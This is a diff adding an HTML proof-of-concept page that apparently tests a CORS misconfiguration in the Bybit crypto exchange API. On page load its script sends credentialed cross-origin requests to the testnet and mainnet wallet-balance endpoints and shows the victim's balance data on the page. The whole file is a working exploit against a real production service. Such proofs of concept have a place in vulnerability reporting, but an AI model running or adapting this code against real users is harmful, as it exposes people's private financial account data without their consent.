@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><title>Bybit CORS PoC</title></head>
+<body>
+<h2>Bybit CORS PoC — darivxe</h2>
+<p><strong>Testnet wallet balance (api-testnet.bybit.com):</strong></p>
+<pre id="testnet-out">fetching...</pre>
+<p><strong>Mainnet wallet balance (api.bybit.com):</strong></p>
+<pre id="mainnet-out">fetching...</pre>
+
+<script>
+const timestamp = Date.now();
+
+// Testnet
+fetch("https://api-testnet.bybit.com/v5/account/wallet-balance?accountType=UNIFIED", {
+  credentials: "include"
+})
+.then(r => r.json())
+.then(data => {
+  document.getElementById("testnet-out").textContent = JSON.stringify(data, null, 2);
+})
+.catch(e => document.getElementById("testnet-out").textContent = "Error: " + e);
+
+// Mainnet
+fetch("https://api.bybit.com/v5/account/wallet-balance?accountType=UNIFIED", {
+  credentials: "include"
+})
+.then(r => r.json())
+.then(data => {
+  document.getElementById("mainnet-out").textContent = JSON.stringify(data, null, 2);
+})
+.catch(e => document.getElementById("mainnet-out").textContent = "Error: " + e);
+</script>
+</body>
+</html>
